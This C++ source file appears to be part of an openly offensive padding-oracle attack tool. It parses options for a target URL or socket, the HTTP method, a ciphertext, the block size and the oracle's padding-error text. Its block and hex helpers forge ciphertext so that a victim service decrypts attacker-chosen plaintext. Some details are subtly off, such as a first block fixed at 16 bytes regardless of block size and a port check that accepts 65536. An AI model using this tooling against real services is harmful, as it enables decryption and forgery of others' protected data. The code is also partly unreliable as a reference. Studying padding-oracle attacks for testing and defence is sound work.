#include <stdexcept> 
#include <iostream>
#include <sstream>
#include <iomanip>
#include <string>

#include "cxxopts/cxxopts.hpp"
#include "include/target.h"
#include "include/common.h"
#include "include/utils.h"
#include "include/log.h"


Args getArgs(int argc, char** argv) {
    Args args;

    try {
        cxxopts::Options options("oracle_padding_attack", "Oracle padding attack tool");

        // define args
        options.add_options()
            ("u,url", "Url pointing to the oracle", cxxopts::value<std::string>())
            ("m,method", "SOCKET, GET, POST or COOKIES method", cxxopts::value<std::string>())
            ("p,port", "Port number for SOCKET method", cxxopts::value<unsigned int>()->default_value("0"))
            ("d,data", "Data to send (GET, POST or COOKIE param depending on the choosen method)", cxxopts::value<std::string>()->default_value(""))
            ("c,cypher", "Cypher text", cxxopts::value<std::string>())
            ("b,block-size", "Block size (8,16,32,64)", cxxopts::value<unsigned int>())
            ("e,padding-error", "Padding error text", cxxopts::value<std::string>())
            ("h,help", "Print usage");

        auto result = options.parse(argc, argv);

        if (result.count("help")) {
            Log::print(options.help());
            exit(0);
        }

        // verify args
        if (!result.count("url") || !result.count("method") || !result.count("cypher") ||
            !result.count("block-size") || !result.count("padding-error")) {
            throw std::runtime_error("Missing required arguments");
        }

        args.blockSize = result["block-size"].as<unsigned int>();
        if (args.blockSize != 8 && args.blockSize != 16 && args.blockSize != 32 && args.blockSize != 64) {
            throw std::runtime_error("Block size must be 8,16,32 or 64");
        }

        args.cypher = result["cypher"].as<std::string>();
        if (args.cypher.size()%args.blockSize != 0) {
            throw std::runtime_error("Your cyphertext is not a multiple of the given block size");
        }

        args.url = result["url"].as<std::string>();
        args.method = result["method"].as<std::string>();
        args.port = result["port"].as<unsigned int>();
        args.data = result["data"].as<std::string>();
        args.paddingError = result["padding-error"].as<std::string>();
        
        if (args.method != "SOCKET" && args.data.empty()) {
            throw std::runtime_error("-d (--data) is required for GET, POST or COOKIES methods.");
        }

        if (args.method == "SOCKET" && args.port == 0) {
            throw std::runtime_error("-p (--port) is required for SOCKET method.");
        }
        if (args.port > 65536) {
            throw std::runtime_error("You must enter a valid port number");
        }

    } catch (const std::exception& e) {
        Log::error(e.what());
        exit(1);
    }

    return args;
}


// Hex manipulation
std::string IntToHex(unsigned int& val) {
    std::stringstream ss;
    ss << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << val;
    
    return ss.str();
}

unsigned int HexToInt(const std::string& hexStr) {
    unsigned int val;
    std::stringstream ss;
    ss << std::hex << hexStr;
    ss >> val;
    return val;
}


// Blocks manipulation
std::vector<std::string> GetBlocks(std::string& cypherText) {
    std::vector<std::string> blocks;

    // first block ok 0x00, useful to decrypt the real first block
    std::string block(16 * 2, '0');
    blocks.push_back(block);
    block.clear();

    const unsigned int blockHexLength = Target::getBlockSize() * 2;

    for (size_t i = 0; i < cypherText.length(); i += blockHexLength) {
        blocks.push_back(cypherText.substr(i, blockHexLength));
    }
    return blocks;
}

void ModifyBlock(std::string& block, std::string val, unsigned int& ind) {
    if (ind < 2*Target::getBlockSize()) {
        block[ind-1] = val[0];
        block[ind] = val[1];
    } else {
        throw std::out_of_range("Index error, overflow detected in ModifyBlock");
    }
}

void BuildBlocks(
    std::string& plainText, 
    std::vector<CypherData>& cypherDataList, 
    std::vector<std::string>& blocks,
    unsigned int& nBlocksNeeded, 
    unsigned int& plainSize
) {
/*
    recall that C1^D2 = P2
    hence if we want C1^D2 = M
    we build C1 as C1 = M^D2
    
    add padding to the desired plain text to validate the decryption
*/
    unsigned int blockSize = Target::getBlockSize();
    unsigned int padLen = blockSize*nBlocksNeeded - plainSize;
    unsigned int N = blockSize;
    std::string block = "";

    unsigned int k;
    unsigned int j;
    unsigned int i;
    unsigned int ascii;

    for (k=0; k<nBlocksNeeded; k++) {
        if (k == nBlocksNeeded-1) {
            N = plainSize - blockSize*k;
        }
        for (i=0; i<N; i++) {
            ascii = static_cast<unsigned int>(plainText[blockSize*k+i]) ^ cypherDataList[k].Dn[i];
            block += IntToHex(ascii);
        }

        // if it is le last block, we have to pad the end of it (when the message lenght isn't a multiple of 16)
        if (k == nBlocksNeeded-1) { 
            for (j=N; j<N+padLen; j++) {
                ascii = padLen ^ cypherDataList[k].Dn[j];
                block += IntToHex(ascii);
            }
        }

        blocks.push_back(block);
    }
}


std::string BlocksToCypher(std::vector<std::string>& blocks, const unsigned int& nBlocks) {
    std::string cypher = "";
    unsigned int i;
    for (i=0; i<nBlocks; i++) {
        cypher += blocks[i];
    }

    return cypher;
}


std::string BlocksToCypher(
    std::vector<std::string>& blocks, 
    const unsigned int& nBlocks,
    std::string& newBlock,
    unsigned int& k,
    const unsigned int& size
) {
    std::string cypher = "";
    unsigned int i;
    for (i=0; i<nBlocks; i++) {
        if (i==k) {
            cypher += newBlock;
        } else {
            cypher += blocks[i];
        }
    }

    return cypher;
}


std::string GetVal(std::string& str, unsigned int& ind) {
    if (ind > 0 && ind < str.length()) {
        std::string val;
        val.push_back(str[ind-1]);
        val.push_back(str[ind]);

        return val;
    }

    throw std::out_of_range("Index error, overflow detected in GetVal"); 
}

